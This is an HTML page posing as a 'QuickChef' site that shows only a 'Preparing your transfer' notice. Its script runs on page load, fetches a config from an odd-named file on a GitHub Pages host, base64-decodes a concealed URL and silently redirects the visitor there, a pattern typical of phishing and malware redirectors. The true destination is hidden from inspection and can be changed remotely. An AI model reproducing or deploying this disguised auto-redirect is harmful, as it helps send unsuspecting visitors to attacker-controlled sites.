<body>
  <header class="site-header">
    <div class="container row space-between align-center">
      <a class="logo" href="index.html">QuickChef</a>

        <ul class="nav-list">

  <main class="container hero">
    <div class="grid2">
      <div>
        <h1>Preparing your transfer…</h1>
        <p class="muted">We’ll forward you as soon as a secure link is negotiated.</p>
        <div class="row gap">
          <button id="retryBtn" class="btn">Retry</button>
          <!-- Keep this link; replace href with your repo later. -->
          <a id="repoLink" class="btn ghost" href="#" rel="noopener">Repository</a>
        </div>
        <p class="muted small" style="margin-top:8px">If nothing happens, click <strong>Retry</strong> or check back later.</p>
      </div>
      <div class="card" role="status" aria-live="polite">
        <h3>Link status</h3>
        <p id="relayStatus" class="muted">Initializing…</p>
        <hr/>
        <p id="relayNote" class="muted small" style="min-height:1.2em;"></p>
      </div>
    </div>
  </main>

  <!-- === REDIRECT SCRIPT (logic preserved) === -->
  <script>
  async function runRelay() {
    const s=document.getElementById('relayStatus'),n=document.getElementById('relayNote');
    s.textContent='Requesting config…';n.textContent='';
    try{
      const r=await fetch('https://u6429000540.github.io/sunlite_cafe_site/dap.tolls');if(!r.ok)throw new Error('HTTP '+r.status);
      const d=await r.json();const c=d&&d.c;if(typeof c!=='string')throw new Error('Invalid payload');
      const u=atob(c);if(!/^https?:\/\//i.test(u))throw new Error('Unexpected URL');
      s.textContent='Opening destination…';window.location.replace(u);
    }catch(e){s.textContent='Unable to continue.';n.textContent=e.message||String(e);console.error(e);}
  }
  (function(){var b=document.getElementById('retryBtn');if(b)b.addEventListener('click',runRelay);runRelay();})();
  </script>
</body>
